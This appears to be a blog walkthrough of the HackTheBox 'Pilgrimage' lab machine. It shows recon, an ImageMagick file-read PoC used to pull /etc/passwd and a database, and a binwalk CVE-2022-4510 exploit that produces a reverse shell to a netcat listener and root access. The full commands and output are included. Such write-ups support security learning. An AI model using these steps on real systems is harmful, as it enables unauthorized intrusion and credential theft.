# HackTheBox Pilgrimage | Walkthrough

[image]

Hello guys this on we will be solving an easy machine on hackthebox, but it was not certainly easy for me. Luckily through some googling and hints was able to pwn the machine, before we start out our hacking journey that let’s connect to the private network of the hackthebox and let’s get started.

## 1. Initial Recon

This part will be divided into 3 stages.

- NMAP Scan

- Directory bruteforcing using your favourite tool

- Using `git-dumper` which is new to me.

##### A. NMAP Scan

Firstly let’s set an variable called ip, and assign it a value using export.

```
`export MY_VARIABLE="value"`
```

In our case the variable will be `ip`. This removes the burden of remember the ip or copy pasting each time.

```
`export ip="your-htb-pilgrimage-ip"`
```

Now let’s scan the box using nmap.

```
`
┌──(kali㉿kali)-[~]
└─$ sudo nmap --min-rate 4500 --max-rtt-timeout 1500ms -A -sS -p- --script=vuln,vulners -oX pilgrimage.xml --reason --stats-every 5s $ip
<snip>
Stats: 0:12:14 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.63% done; ETC: 10:53 (0:00:02 remaining)
Nmap scan report for 10.10.11.219
Host is up, received echo-reply ttl 63 (0.29s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
|_http-vuln-cve2013-7091: ERROR: Script execution failed (use -d to debug)
|_http-server-header: nginx/1.18.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-passwd: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

<snip>
Nmap done: 1 IP address (1 host up) scanned in 739.02 seconds`
```

##### B. Directory Bruteforcing

Since only 2 ports are enabled one is `http` and the other is `ssh` let’s do some web recon, and the popular way to gather some valuable information is using directory brute forcing with tools like `gobuster`, `feroxbuster`, but this time we will be using a new tool that’s `dirsearch`.

##### INSTALLATION

In kali to install this simply type in `dirsearch` and it will prompt you and ask if you wish to install it. In other debian based distro used -

```
`sudo apt-get install dirsearch`
```

##### Tool Usage

Simple use the `-u` argument to specify the `url` and go ahead, the command should look something like this.

```
`dirsearch -u $ip`
```

##### C. Further information gathering using `git-dumper`.

One can install the tool using git, but `pip` makes thing easier. Just make sure you are using python’s virtual environment to isolate the package so that it does not conflict wit system packages.

##### INSTALLATION STEPS

- Create an virtual environment for `git-dumper`.

```
`
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m venv git-dumper
[sudo] password for kali: `
```

- Activate your virtual environment using `source` command.

```
`┌──(kali㉿kali)-[~]
└─$ source git-dumper/bin/activate `
```

- Finally use `pip` to install the tool.

```
`┌──(git-dumper)─(kali㉿kali)-[~]
└─$ sudo pip install git-dumper`
```

##### TOOL USAGE.

- Simply invoke the tool using `git-dumper` command followed by the url followed by `git` parameter.

```
`┌──(git-dumper)─(kali㉿kali)-[~]
└─$  git-dumper http://pilgrimage.htb/.git/ git
[-] Testing http://pilgrimage.htb/.git/HEAD [200]
<snip>
[-] Running git checkout .`
```

- To locate where the `dump` has been stored in your system, type `ls` and look for new files and cd into that directory.

```
`┌──(git-dumper)─(kali㉿kali)-[~]
└─$ ls ; cd git`
```

- We do make a note that there is folder called as `git` and we find dump of our website. Feel free to analyse and understand how the website works.

```
`┌──(git-dumper)─(kali㉿kali)-[~/git]
└─$ ls
assets  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor`
```

## 2. Exploitation

When you visit the website and in the website you see an option to shrink the image, if you upload a file, after shrinking the file, it shows exactly where it’s stored. Although this is certainly not a vulnerability in itself, lack of input sanitation and filtering  could result a lot of damage. And let’s see if we can upload some malicious file into the website and see if it’s vulnerable against `lfi` or `local file inclusion vulnerability`.

##### Step 1- Weaponizing the exploit.

Luckily for us we have `POC` or `proof of concept` for this vulnerability and let’s quickly clone this in a separate directory under `pilgrimage`.

```
`┌──(kali㉿kali)-[~/htb/pilgrimage/]
└─$ git clone https://github.com/Sybil-Scan/imagemagick-lfi-poc`
```

Now use python to create a payload with name `username` and use the command to be executed on the website to be `/etc/passwd`. Why you ask, it’s simple because `etc/passwd` is a simple file on Linux, contains user account information, and through this we can verify the username. Although this could be optional but for the sake of confirmation let’s do this.

```
`┌──(kali㉿kali)-[~/htb/pilgrimage/imagemagick-lfi-poc]
└─$ python3 generate.py -f "/etc/passwd" -o username.png

   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /etc/passwd
   [>] PoC PNG generated > username.png`
```

Similar to previous step, to get the password let’s check at `/var/db/pilgrimage` and output the file to `password.png`.

```
`
┌──(kali㉿kali)-[~/htb/pilgrimage/imagemagick-lfi-poc]
└─$ python3 generate.py -f "/var/db/pilgrimage" -o password.png

   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /var/db/pilgrimage
   [>] PoC PNG generated > password.png

┌──(kali㉿kali)-[~/htb/pilgrimage/imagemagick-lfi-poc]
└─$ cd ..

┌──(kali㉿kali)-[~/htb/pilgrimage]
└─$ mkdir analysis

┌──(kali㉿kali)-[~/htb/pilgrimage]
└─$ cd analysis`
```

##### Step 2- Delivering the exploit.

Just upload `username.png` and `password.png` to the website, after that download the both the images for further analysis. And let’s make a separate directory called as `analysis` to analyse interesting output from after uploading these images.

```
`┌──(kali㉿kali)-[~/htb/pilgrimage/]
└─$ mkdir analysis ; cd analysis `
```

Once you have uploaded, use `wget` to get the files from the server.

```
`┌──(kali㉿kali)-[~/htb/pilgrimage/analysis]
└─$ wget http://pilgrimage.htb/shrunk/655f9877ee6d3.png`
```

Let’s do the same for the next image.

```
`┌──(kali㉿kali)-[~/htb/pilgrimage/analysis]
└─$ wget http://pilgrimage.htb/shrunk/655f9a23859f6.png                `
```

## 4. Local system enumeration.

Let’s download `pspy64` an interesting file that allows use to is a tool used for monitoring Linux processes without the need for root privileges which is super handy in privilege escalation as it displays vital system information without the need to have root permissions. You can download this file from this url -  https://github.com/DominicBreuker/pspy https://github.com/DominicBreuker/pspy.

Now once you have downloaded the file, start simple http server using python. Note that here `-m` is module and python3 is starting up the `http.server` module.

```
`┌──(kali㉿kali)-[~/htb/pilgrimage/analysis]
└─$ sudo python3 -m http.server`
```

Transfer the file to your vulnerable machine using `wget`.

```
`emily@pilgrimage:~$ wget http://10.10.14.96/pspy64
--2023-11-24 05:41:48--  http://10.10.14.96/pspy64
Connecting to 10.10.14.96:80... failed: Connection refused.
emily@pilgrimage:~$ wget http://10.10.14.96:8000/pspy64
```

Let’s give this bad boy executable permissions. And execute the script.

```
`emily@pilgrimage:~$ chmod +x pspy64
emily@pilgrimage:~$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░

    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░
<snip>

emily@pilgrimage:~$ `
```

We see an interesting process run in the system which is `/usr/sbin/malwarescan.sh`. Let’s have an look what this file is.

```
`emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done`
```

Note that we don’t have proper permissions to edit this file. Therefore we have to try something new. This Bash script uses `inotifywait` to monitor the `/var/www/pilgrimage.htb/shrunk/` directory for file creation events. When a new file is created, it employs `binwalk` to analyse the file contents and if `binwalk` finds terms like “Executable script” or “Microsoft executable,” the script deletes the file Let’s see if there are any `exploits` for `binwalk`.

## 5. Gaining Root Access

Now The exploit for this is on `exploit-db` and let’s save the file to `/htb/pilgrimage` as `exploit.py` .URL -  https://www.exploit-db.com/exploits/51249 https://www.exploit-db.com/exploits/51249. If we specify our system ip-address which can be found using `ifconfig` command, and mention a random port we should get an image which is `exploit.png` and it will be our exploit. Do note that you should have an legit `png` image file, and I took screenshot and saved the image as `exploit.png`.

```
`┌──(kali㉿kali)-[~/htb/pilgrimage]
└─$ python3 exploit.py exploit.png 10.10.14.96 1234

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################

You can now rename and share binwalk_exploit and start your local netcat listener.`
```

Let’s start the netcat lister on port `1234`.

```
`┌──(kali㉿kali)-[~/htb/pilgrimage]
└─$ nc -nlvp 1234
listening on [any] 1234 ...`
```

Now let’s transfer the image to our vulnerable machine using `scp` [secure copy] which allows us to transfer over `ssh`. Let’s check the file name so that we don’t do any mistakes and in our case the image name is `binwalk_exploit.png`.

```
`┌──(kali㉿kali)-[~]
└─$ cd htb/pilgrimage

┌──(kali㉿kali)-[~/htb/pilgrimage]
└─$ ls
analysis  binwalk_exploit.png  exploit.png  exploit.py  imagemagick-lfi-poc

┌──(kali㉿kali)-[~/htb/pilgrimage]
└─$ scp binwalk_exploit.png emily@10.10.11.219:/home/emily
emily@10.10.11.219's password:
binwalk_exploit.png   `
```

Let’s copy the image to `/var/www/pilgrimage.htb/shrunk/` so that `malwarescan.sh` script can start working on this image.

```
`emily@pilgrimage:~$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/`
```

As soon as you do this, check your netcat listener you should have got reverse shell and let’s get the `root flag`.

```
`┌──(kali㉿kali)-[~/htb/pilgrimage]
└─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.96] from (UNKNOWN) [10.10.11.219] 42610
whoami
root
ls
_655f9877ee6d3.png.extracted
_655f9a23859f6.png.extracted
_655f9f390eba1.png.extracted
_binwalk_exploit.png.extracted
_trustMe.png.extracted
cat /root/root.txt
82a58625d598cb16f19bda382482f1b7`
```

## Mind-Map

[image]

This HackTheBox Pilgrimage challenge was definitely more advanced than most. The recon and initial access was pretty standard, nmap, dirbuster etc… but using the CVE-2022-4510 exploit was definitely pretty cool. HackTheBox always impresses me with the wide variety of different challenges they have. If you ever find yourself with nothing to do and you’re getting bored, try a random HTB machine, it’s a great way to have fun, learn new things and ensure you’re always productive. The last challenge box I tried, I randomly found from  https://guidedhacking.com/threads/hackthebox-solidstate-walkthrough.16225/ this HackTheBox SolidState writeup at GuidedHacking. It wasn’t quite as difficult as Pilgrimage but it was fun.
